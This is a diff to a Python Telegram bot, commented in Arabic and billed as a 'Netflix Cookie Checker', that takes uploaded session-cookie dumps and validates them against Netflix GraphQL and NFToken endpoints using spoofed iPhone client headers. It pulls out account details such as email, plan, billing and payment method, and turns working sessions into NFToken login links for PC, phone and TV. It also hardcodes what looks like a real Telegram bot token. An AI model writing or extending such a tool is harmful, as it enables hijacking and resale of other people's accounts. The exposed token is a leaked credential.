@@ -19,6 +19,11 @@ import requests
 from urllib3.exceptions import InsecureRequestWarning
 import telebot
 
+try:
+    import yaml
+except ImportError:
+    yaml = None
+
 # توكن البوت الخاص بك
 TELEGRAM_BOT_TOKEN = "8405233850:AAGjodPeCXW8TVX9b75oPeTzNEKFvtbW8FA"
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
@@ -48,19 +53,82 @@ DEFAULT_CONFIG = {
     },
     "nftoken": True,
     "add_emojis": "webhook",
+    "notifications": {
+        "telegram": {
+            "enabled": True,
+            "bot_token": TELEGRAM_BOT_TOKEN,
+            "chat_id": "",
+            "mode": "full",
+            "plans": "all",
+        },
+    },
+    "display": {"mode": "simple"},
     "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
     "performance": {"request_timeout_seconds": 15, "fallback_account_page": True, "retry_incomplete_info": False, "nftoken_for_free": True},
 }
+
+DEFAULT_YAML_CONFIG = """txt_fields:
+  name: false
+  email: true
+  plan: true
+  country: true
+  member_since: false
+  quality: true
+  max_streams: true
+  plan_price: true
+  next_billing: true
+  payment_method: true
+  card: false
+  phone: false
+  hold_status: true
+  extra_members: true
+  email_verified: false
+  membership_status: true
+  profiles: true
+  user_guid: false
+
+nftoken: true
+add_emojis: "webhook"
+
+notifications:
+  telegram:
+    enabled: true
+    bot_token: "8405233850:AAGjodPeCXW8TVX9b75oPeTzNEKFvtbW8FA"
+    chat_id: ""
+    mode: "full"
+    plans: "all"
+
+display:
+  mode: "simple"
+
+retries:
+  error_proxy_attempts: 3
+  nftoken_attempts: 1
+
+performance:
+  request_timeout_seconds: 15
+  fallback_account_page: true
+  retry_incomplete_info: false
+  nftoken_for_free: true
+"""
+
+BANNER = """
+Netflix Cookie Checker - Complete Engine with Telegram & CLI
+"""
 
 cookies_folder = "cookies"
 output_folder = "output"
 failed_folder = "failed"
 broken_folder = "broken"
+proxy_file = "proxy.txt"
 
 os.makedirs(cookies_folder, exist_ok=True)
 os.makedirs(output_folder, exist_ok=True)
 os.makedirs(failed_folder, exist_ok=True)
 os.makedirs(broken_folder, exist_ok=True)
+
+guid_lock = threading.Lock()
+processed_emails = set()
 
 LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
 OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
@@ -105,6 +173,9 @@ NFTOKEN_HEADERS = {
     "x-netflix.client.type": "argo",
     "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
     "x-netflix.context.locales": "en-US",
+    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.client.iosversion": "15.8.5",
+    "accept-language": "en-US;q=1",
     "x-netflix.argo.abtests": "",
     "x-netflix.context.os-version": "15.8.5",
     "x-netflix.request.client.context": '{"appState":"foreground"}',
@@ -239,7 +310,6 @@ def extract_netflix_cookie_bundles(content):
             return [{"index": 1, "total": 1, "netscape_text": netscape_text, "cookies": cookies_dict}]
     return []
 
-# استعلامات GraphQL المتقدمة لتحليل الحسابات
 def extract_info_from_graphql_payload(response_text):
     try:
         payload = json.loads(response_text)
@@ -304,7 +374,6 @@ def is_subscribed_account(info):
     status = normalize_plan_key((info or {}).get("membershipStatus"))
     return status == "current_member" or is_extra_member_account(info) or bool((info or {}).get("localizedPlanName"))
 
-# استخراج الـ NFToken وتوليد روابط الأنظمة المتعددة وحساب التواريخ بدقة
 def get_nftoken_expiry_utc(expires=None):
     if isinstance(expires, (int, float)):
         try:
@@ -338,9 +407,9 @@ def create_nftoken(cookie_dict, attempts=1):
 
 def build_nftoken_links(token):
     return [
-        ("🖥️ PC Login", f"https://netflix.com/?nftoken={token}"),
-        ("📱 Phone Login", f"https://netflix.com/unsupported?nftoken={token}"),
-        ("📺 TV Login", f"https://netflix.com/tv2?nftoken={token}"),
+        ("🖥️ PC", f"https://netflix.com/?nftoken={token}"),
+        ("📱 Phone", f"https://netflix.com/unsupported?nftoken={token}"),
+        ("📺 TV", f"https://netflix.com/tv2?nftoken={token}"),
     ]
 
 def get_account_page(session, request_timeout=15):
@@ -353,10 +422,9 @@ def get_account_page(session, request_timeout=15):
         pass
     return None, 500, None
 
-# بوت تيليغرام مع نظام إدارة المهام والتعدد (Queue, Lock, Bundles)
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    bot.reply_to(message, "مرحباً بك! أرسل ملف الكوكيز بصيغة **JSON** أو **TXT** أو ملف **ZIP** وسأقوم بفحصه بأعلى احترافية ومحرك GraphQL بالكامل.")
+    bot.reply_to(message, "أهلاً بك! أرسل ملف الكوكيز (JSON أو TXT أو ZIP) وسأقوم بفحصه بأعلى كفاءة عبر محرك الـ GraphQL وجميع الروابط.")
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -364,10 +432,10 @@ def handle_docs(message):
     file_name = message.document.file_name.lower()
 
     if not (file_name.endswith('.json') or file_name.endswith('.txt') or file_name.endswith('.zip')):
-        bot.reply_to(message, "⚠️ يرجى إرسال ملف بصيغة JSON أو TXT أو ZIP فقط.")
+        bot.reply_to(message, "⚠️ يرجى إرسال ملف JSON أو TXT أو ZIP صالح.")
         return
 
-    msg = bot.reply_to(message, "⏳ جاري تحميل الملف وتقسيمه إلى أجزاء (Bundles) للمعالجة عبر الـ Queue...")
+    msg = bot.reply_to(message, "⏳ جاري المعالجة وتقسيم الملفات (Bundles) باستخدام نظام الـ Queue والخيوط المتعددة...")
 
     try:
         downloaded_file = bot.download_file(file_info.file_path)
@@ -391,8 +459,6 @@ def handle_docs(message):
         if not bundles_to_check:
             bot.edit_message_text("⚠️ لم يتم العثور على كوكيز نتفليكس صالحة.", chat_id=message.chat.id, message_id=msg.message_id)
             return
-
-        bot.edit_message_text(f"🔍 جاري فحص {len(bundles_to_check)} حساب باستخدام نظام الـ Multithreading (Queue & Lock)...", chat_id=message.chat.id, message_id=msg.message_id)
 
         task_queue = queue.Queue()
         for item in bundles_to_check:
@@ -459,7 +525,7 @@ def handle_docs(message):
         for t in threads:
             t.join()
 
-        summary = f"📊 **نتائج فحص الكوكيز الشامل:**\n\n🟢 شغال: {working_count[0]}\n🔴 منتهي: {expired_count[0]}\n\n{results_text[0]}"
+        summary = f"📊 **نتائج فحص الكوكيز:**\n\n🟢 شغال: {working_count[0]}\n🔴 منتهي: {expired_count[0]}\n\n{results_text[0]}"
         if len(summary) > 4000:
             summary = summary[:4000] + "\n...(تم اختصار النتائج للطول)"
 
@@ -469,5 +535,5 @@ def handle_docs(message):
         bot.edit_message_text(f"⚠️ حدث خطأ أثناء المعالجة: {str(e)}", chat_id=message.chat.id, message_id=msg.message_id)
 
 if __name__ == "__main__":
-    print("[🚀] Full Advanced Netflix Checker Bot (GraphQL, NFToken, Multithreading Queue & Bundles) is running via CMD...")
+    print("[🚀] Full Netflix Checker & Telegram Bot Engine is running...")
     bot.infinity_polling()
